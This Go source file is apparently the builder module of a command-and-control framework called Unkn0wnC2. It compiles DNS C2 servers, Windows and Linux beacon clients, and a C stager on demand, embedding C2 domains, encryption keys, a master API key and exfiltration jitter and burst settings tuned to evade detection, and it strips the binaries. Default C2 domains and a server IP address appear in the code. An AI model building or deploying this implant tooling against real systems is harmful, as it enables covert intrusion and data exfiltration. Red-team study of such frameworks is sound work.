// Package main implements the builder functionality for Unkn0wnC2 Master Server.
// This file handles on-demand compilation of DNS servers, clients, and stagers.
package main

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	buildsDir = "builds" // Directory to store compiled binaries
)

// Builder request structures
type DNSServerBuildRequest struct {
	Domain        string `json:"domain"`
	NS1           string `json:"ns1"`
	NS2           string `json:"ns2"`
	UpstreamDNS   string `json:"upstream_dns"`
	ServerAddress string `json:"server_address"`
	EncryptionKey string `json:"encryption_key"`
}

type ClientBuildRequest struct {
	DNSDomains          []string `json:"dns_domains"`
	Platform            string   `json:"platform"`
	SleepMin            int      `json:"sleep_min"`
	SleepMax            int      `json:"sleep_max"`
	ExfilJitterMinMs    int      `json:"exfil_jitter_min_ms"`
	ExfilJitterMaxMs    int      `json:"exfil_jitter_max_ms"`
	ExfilChunksPerBurst int      `json:"exfil_chunks_per_burst"`
	ExfilBurstPauseMs   int      `json:"exfil_burst_pause_ms"`
}

type StagerBuildRequest struct {
	Domain         string `json:"domain"`
	Platform       string `json:"platform"`
	PayloadURL     string `json:"payload_url"`
	JitterMinMs    int    `json:"jitter_min_ms"`
	JitterMaxMs    int    `json:"jitter_max_ms"`
	ChunksPerBurst int    `json:"chunks_per_burst"`
	BurstPauseMs   int    `json:"burst_pause_ms"`
}

// Web UI handler for builder page
func (api *APIServer) handleBuilderPage(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "builder.html"))
}

// handleBuildDNSServer builds a DNS server binary with provided configuration
func (api *APIServer) handleBuildDNSServer(w http.ResponseWriter, r *http.Request) {
	var req DNSServerBuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Validate required fields
	if req.Domain == "" {
		api.sendError(w, http.StatusBadRequest, "domain is required")
		return
	}

	if req.ServerAddress == "" {
		api.sendError(w, http.StatusBadRequest, "server address is required for A records")
		return
	}

	// Auto-generate NS1 and NS2 from domain if not provided
	if req.NS1 == "" {
		req.NS1 = "ns1." + req.Domain
	}
	if req.NS2 == "" {
		req.NS2 = "ns2." + req.Domain
	}

	// Generate encryption key if not provided
	if req.EncryptionKey == "" {
		keyBytes := make([]byte, 32)
		rand.Read(keyBytes)
		req.EncryptionKey = hex.EncodeToString(keyBytes)[:32]
	}

	// Generate API key for this DNS server
	apiKeyBytes := make([]byte, 16)
	rand.Read(apiKeyBytes)
	apiKey := hex.EncodeToString(apiKeyBytes)

	// NOTE: Don't register in DB until build succeeds - see below
	serverID := fmt.Sprintf("dns-%d", time.Now().Unix())

	// Get master server URL from config
	masterURL := fmt.Sprintf("https://%s:%d", api.config.BindAddr, api.config.BindPort)

	// Build the server
	binaryPath, err := api.buildDNSServer(req, masterURL, apiKey, serverID)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("build failed: %v", err))
		return
	}
	defer os.Remove(binaryPath)

	// Register DNS server in database ONLY after successful build
	err = api.db.RegisterDNSServer(serverID, req.Domain, req.ServerAddress, apiKey)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to register DNS server: %v", err))
		return
	}

	// Save binary to builds directory
	filename := fmt.Sprintf("dns-server-%s-%d", req.Domain, time.Now().Unix())
	savedPath, err := api.saveBuild(binaryPath, filename, "dns-server")
	if err != nil {
		// Log but don't fail - still send the binary
		fmt.Printf("Warning: failed to save build: %v\n", err)
	} else {
		fmt.Printf("Build saved to: %s\n", savedPath)
	}

	// Send binary as download
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"dns-server-%s\"", req.Domain))

	file, err := os.Open(binaryPath)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to read binary")
		return
	}
	defer file.Close()

	io.Copy(w, file)
}

// handleBuildClient builds a client binary with provided configuration
func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) {
	var req ClientBuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Validate
	if len(req.DNSDomains) == 0 {
		api.sendError(w, http.StatusBadRequest, "at least one DNS domain is required")
		return
	}

	// Build the client
	binaryPath, err := buildClient(req, api.config.SourceDir)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("build failed: %v", err))
		return
	}
	defer os.Remove(binaryPath)

	// Save binary to builds directory
	ext := ""
	if req.Platform == "windows" {
		ext = ".exe"
	}
	filename := fmt.Sprintf("beacon-%s-%d%s", req.Platform, time.Now().Unix(), ext)
	savedPath, err := api.saveBuild(binaryPath, filename, "client")
	if err != nil {
		fmt.Printf("Warning: failed to save build: %v\n", err)
	} else {
		fmt.Printf("Build saved to: %s\n", savedPath)
	}

	// Send binary as download
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"beacon-%s%s\"", req.Platform, ext))

	file, err := os.Open(binaryPath)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to read binary")
		return
	}
	defer file.Close()

	io.Copy(w, file)
}

// handleBuildStager builds a stager binary with provided configuration
func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) {
	var req StagerBuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Validate
	if req.Domain == "" {
		api.sendError(w, http.StatusBadRequest, "domain is required")
		return
	}

	// Build the stager
	binaryPath, err := buildStager(req, api.config.SourceDir)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("build failed: %v", err))
		return
	}
	defer os.Remove(binaryPath)

	// Save binary to builds directory
	ext := ""
	if req.Platform == "windows" {
		ext = ".exe"
	}
	filename := fmt.Sprintf("stager-%s-%d%s", req.Platform, time.Now().Unix(), ext)
	savedPath, err := api.saveBuild(binaryPath, filename, "stager")
	if err != nil {
		fmt.Printf("Warning: failed to save build: %v\n", err)
	} else {
		fmt.Printf("Build saved to: %s\n", savedPath)
	}

	// Send binary as download
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"stager-%s%s\"", req.Platform, ext))

	file, err := os.Open(binaryPath)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to read binary")
		return
	}
	defer file.Close()

	io.Copy(w, file)
}

// buildDNSServer compiles a DNS server with embedded configuration
func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKey, serverID string) (string, error) {
	// Create temporary directory for build
	buildDir, err := os.MkdirTemp("", "dns-server-build-*")
	if err != nil {
		return "", fmt.Errorf("failed to create build directory: %w", err)
	}
	defer os.RemoveAll(buildDir)

	// Copy Server source files to build directory
	serverSrcDir := filepath.Join(api.config.SourceDir, "Server")
	if err := copyDir(serverSrcDir, buildDir); err != nil {
		return "", fmt.Errorf("failed to copy source: %w", err)
	}

	// Update config.go with embedded configuration
	configPath := filepath.Join(buildDir, "config.go")
	config, err := os.ReadFile(configPath)
	if err != nil {
		return "", fmt.Errorf("failed to read config: %w", err)
	}

	// Replace embedded config values
	configStr := string(config)
	configStr = strings.Replace(configStr, `Domain:        "secwolf.net"`, fmt.Sprintf(`Domain:        "%s"`, req.Domain), 1)
	configStr = strings.Replace(configStr, `NS1:           "ns1.secwolf.net"`, fmt.Sprintf(`NS1:           "%s"`, req.NS1), 1)
	configStr = strings.Replace(configStr, `NS2:           "ns2.secwolf.net"`, fmt.Sprintf(`NS2:           "%s"`, req.NS2), 1)
	configStr = strings.Replace(configStr, `UpstreamDNS:   "8.8.8.8:53"`, fmt.Sprintf(`UpstreamDNS:   "%s"`, req.UpstreamDNS), 1)
	configStr = strings.Replace(configStr, `EncryptionKey:  "MySecretC2Key123!@#DefaultChange"`, fmt.Sprintf(`EncryptionKey:  "%s"`, req.EncryptionKey), 1)
	if req.ServerAddress != "" {
		configStr = strings.Replace(configStr, `SvrAddr:       "98.90.218.70"`, fmt.Sprintf(`SvrAddr:       "%s"`, req.ServerAddress), 1)
	}
	// Set distributed mode config
	configStr = strings.Replace(configStr, `MasterServer:   "",`, fmt.Sprintf(`MasterServer:   "%s",`, masterURL), 1)
	configStr = strings.Replace(configStr, `MasterAPIKey:   "",`, fmt.Sprintf(`MasterAPIKey:   "%s",`, apiKey), 1)
	configStr = strings.Replace(configStr, `MasterServerID: "dns1",`, fmt.Sprintf(`MasterServerID: "%s",`, serverID), 1)

	if err := os.WriteFile(configPath, []byte(configStr), 0644); err != nil {
		return "", fmt.Errorf("failed to write config: %w", err)
	}

	// Build binary
	outputPath := filepath.Join("/opt/unkn0wnc2/builders", fmt.Sprintf("dns-server-%s-%d", req.Domain, time.Now().Unix()))
	cmd := exec.Command("go", "build", "-trimpath", "-ldflags=-s -w", "-o", outputPath, ".")
	cmd.Dir = buildDir
	cmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH=amd64")

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("build failed: %w\nOutput: %s", err, string(output))
	}

	return outputPath, nil
}

// buildClient compiles a client with embedded configuration
func buildClient(req ClientBuildRequest, sourceRoot string) (string, error) {
	// Create temporary directory for build
	buildDir, err := os.MkdirTemp("", "client-build-*")
	if err != nil {
		return "", fmt.Errorf("failed to create build directory: %w", err)
	}
	defer os.RemoveAll(buildDir)

	// Copy Client source files
	clientSrcDir := filepath.Join(sourceRoot, "Client")
	if err := copyDir(clientSrcDir, buildDir); err != nil {
		return "", fmt.Errorf("failed to copy source: %w", err)
	}

	// Update config.go with DNS domains and timing
	configPath := filepath.Join(buildDir, "config.go")
	config, err := os.ReadFile(configPath)
	if err != nil {
		return "", fmt.Errorf("failed to read config: %w", err)
	}

	configStr := string(config)

	// Format DNS domains array
	domainsStr := "[]string{"
	for i, domain := range req.DNSDomains {
		if i > 0 {
			domainsStr += ", "
		}
		domainsStr += fmt.Sprintf(`"%s"`, domain)
	}
	domainsStr += "}"

	// Replace values
	configStr = strings.Replace(configStr, `DNSDomains:          []string{"secwolf.net", "errantshield.com"},`, fmt.Sprintf(`DNSDomains:          %s,`, domainsStr), 1)
	configStr = strings.Replace(configStr, `SleepMin:             60,`, fmt.Sprintf(`SleepMin:             %d,`, req.SleepMin), 1)
	configStr = strings.Replace(configStr, `SleepMax:             120,`, fmt.Sprintf(`SleepMax:             %d,`, req.SleepMax), 1)
	configStr = strings.Replace(configStr, `ExfilJitterMinMs:     10000,`, fmt.Sprintf(`ExfilJitterMinMs:     %d,`, req.ExfilJitterMinMs), 1)
	configStr = strings.Replace(configStr, `ExfilJitterMaxMs:     30000,`, fmt.Sprintf(`ExfilJitterMaxMs:     %d,`, req.ExfilJitterMaxMs), 1)
	configStr = strings.Replace(configStr, `ExfilChunksPerBurst:  5,`, fmt.Sprintf(`ExfilChunksPerBurst:  %d,`, req.ExfilChunksPerBurst), 1)
	configStr = strings.Replace(configStr, `ExfilBurstPauseMs:    120000,`, fmt.Sprintf(`ExfilBurstPauseMs:    %d,`, req.ExfilBurstPauseMs), 1)

	if err := os.WriteFile(configPath, []byte(configStr), 0644); err != nil {
		return "", fmt.Errorf("failed to write config: %w", err)
	}

	// Build binary
	ext := ""
	goos := "linux"
	if req.Platform == "windows" {
		ext = ".exe"
		goos = "windows"
	}

	outputPath := filepath.Join("/opt/unkn0wnc2/builders", fmt.Sprintf("beacon-%s-%d%s", req.Platform, time.Now().Unix(), ext))
	cmd := exec.Command("go", "build", "-trimpath", "-ldflags=-s -w", "-o", outputPath, ".")
	cmd.Dir = buildDir
	cmd.Env = append(os.Environ(), fmt.Sprintf("GOOS=%s", goos), "GOARCH=amd64")

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("build failed: %w\nOutput: %s", err, string(output))
	}

	return outputPath, nil
}

// buildStager compiles a stager with embedded configuration
func buildStager(req StagerBuildRequest, sourceRoot string) (string, error) {
	// Stager is in C, needs different build process
	// Create temporary directory
	buildDir, err := os.MkdirTemp("", "stager-build-*")
	if err != nil {
		return "", fmt.Errorf("failed to create build directory: %w", err)
	}
	defer os.RemoveAll(buildDir)

	// Copy Stager source files
	stagerSrcDir := filepath.Join(sourceRoot, "Stager")
	if err := copyDir(stagerSrcDir, buildDir); err != nil {
		return "", fmt.Errorf("failed to copy source: %w", err)
	}

	// Update stager.c with domain and timing configuration
	stagerPath := filepath.Join(buildDir, "stager.c")
	stagerCode, err := os.ReadFile(stagerPath)
	if err != nil {
		return "", fmt.Errorf("failed to read stager.c: %w", err)
	}

	codeStr := string(stagerCode)
	codeStr = strings.Replace(codeStr, `#define C2_DOMAIN "secwolf.net"`, fmt.Sprintf(`#define C2_DOMAIN "%s"`, req.Domain), 1)
	codeStr = strings.Replace(codeStr, `#define MIN_CHUNK_DELAY_MS 60000`, fmt.Sprintf(`#define MIN_CHUNK_DELAY_MS %d`, req.JitterMinMs), 1)
	codeStr = strings.Replace(codeStr, `#define MAX_CHUNK_DELAY_MS 120000`, fmt.Sprintf(`#define MAX_CHUNK_DELAY_MS %d`, req.JitterMaxMs), 1)
	codeStr = strings.Replace(codeStr, `#define CHUNKS_PER_BURST 5`, fmt.Sprintf(`#define CHUNKS_PER_BURST %d`, req.ChunksPerBurst), 1)
	codeStr = strings.Replace(codeStr, `#define BURST_PAUSE_MS 120000`, fmt.Sprintf(`#define BURST_PAUSE_MS %d`, req.BurstPauseMs), 1)

	if err := os.WriteFile(stagerPath, []byte(codeStr), 0644); err != nil {
		return "", fmt.Errorf("failed to write stager.c: %w", err)
	}

	// Build using make
	ext := ""
	target := "linux"
	if req.Platform == "windows" {
		ext = ".exe"
		target = "windows"
	}

	cmd := exec.Command("make", target)
	cmd.Dir = buildDir

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("build failed: %w\nOutput: %s", err, string(output))
	}

	// Copy built binary to output location
	srcBinary := filepath.Join(buildDir, fmt.Sprintf("stager-%s-x64%s", req.Platform, ext))
	outputPath := filepath.Join("/opt/unkn0wnc2/builders", fmt.Sprintf("stager-%s-%d%s", req.Platform, time.Now().Unix(), ext))

	if err := copyFile(srcBinary, outputPath); err != nil {
		return "", fmt.Errorf("failed to copy binary: %w", err)
	}

	return outputPath, nil
}

// Helper functions

func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		relPath, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}

		targetPath := filepath.Join(dst, relPath)

		if info.IsDir() {
			return os.MkdirAll(targetPath, info.Mode())
		}

		return copyFile(path, targetPath)
	})
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}

// saveBuild saves a compiled binary to the builds directory
func (api *APIServer) saveBuild(sourcePath, filename, buildType string) (string, error) {
	// Ensure builds directory exists
	typeDir := filepath.Join(buildsDir, buildType)
	if err := os.MkdirAll(typeDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create builds directory: %w", err)
	}

	// Copy binary to builds directory
	destPath := filepath.Join(typeDir, filename)
	if err := copyFile(sourcePath, destPath); err != nil {
		return "", fmt.Errorf("failed to copy binary: %w", err)
	}

	return destPath, nil
}

// Build represents a saved build
type Build struct {
	Name      string    `json:"name"`
	Type      string    `json:"type"`
	Size      int64     `json:"size"`
	Timestamp time.Time `json:"timestamp"`
	Path      string    `json:"path"`
}

// handleListBuilds returns a list of all saved builds
func (api *APIServer) handleListBuilds(w http.ResponseWriter, r *http.Request) {
	builds := []Build{}

	// Walk through builds directory
	buildTypes := []string{"dns-server", "client", "stager"}
	for _, buildType := range buildTypes {
		typeDir := filepath.Join(buildsDir, buildType)

		entries, err := os.ReadDir(typeDir)
		if err != nil {
			if !os.IsNotExist(err) {
				fmt.Printf("Warning: failed to read %s directory: %v\n", buildType, err)
			}
			continue
		}

		for _, entry := range entries {
			if entry.IsDir() {
				continue
			}

			info, err := entry.Info()
			if err != nil {
				continue
			}

			builds = append(builds, Build{
				Name:      entry.Name(),
				Type:      buildType,
				Size:      info.Size(),
				Timestamp: info.ModTime(),
				Path:      filepath.Join(buildType, entry.Name()),
			})
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(builds)
}

// handleDownloadBuild downloads a previously saved build
func (api *APIServer) handleDownloadBuild(w http.ResponseWriter, r *http.Request) {
	// Get build path from query parameter
	buildPath := r.URL.Query().Get("path")
	if buildPath == "" {
		api.sendError(w, http.StatusBadRequest, "path parameter is required")
		return
	}

	// Sanitize path to prevent directory traversal
	buildPath = filepath.Clean(buildPath)
	if strings.Contains(buildPath, "..") {
		api.sendError(w, http.StatusBadRequest, "invalid path")
		return
	}

	// Construct full path
	fullPath := filepath.Join(buildsDir, buildPath)

	// Check if file exists
	info, err := os.Stat(fullPath)
	if err != nil {
		if os.IsNotExist(err) {
			api.sendError(w, http.StatusNotFound, "build not found")
			return
		}
		api.sendError(w, http.StatusInternalServerError, "failed to access build")
		return
	}

	if info.IsDir() {
		api.sendError(w, http.StatusBadRequest, "path is a directory")
		return
	}

	// Send file
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filepath.Base(buildPath)))
	http.ServeFile(w, r, fullPath)
}

// handleDeleteBuild deletes a saved build
func (api *APIServer) handleDeleteBuild(w http.ResponseWriter, r *http.Request) {
	// Get build path from query parameter
	buildPath := r.URL.Query().Get("path")
	if buildPath == "" {
		api.sendError(w, http.StatusBadRequest, "path parameter is required")
		return
	}

	// Sanitize path to prevent directory traversal
	buildPath = filepath.Clean(buildPath)
	if strings.Contains(buildPath, "..") {
		api.sendError(w, http.StatusBadRequest, "invalid path")
		return
	}

	// Construct full path
	fullPath := filepath.Join(buildsDir, buildPath)

	// Delete file
	if err := os.Remove(fullPath); err != nil {
		if os.IsNotExist(err) {
			api.sendError(w, http.StatusNotFound, "build not found")
			return
		}
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to delete build: %v", err))
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "deleted"})
}
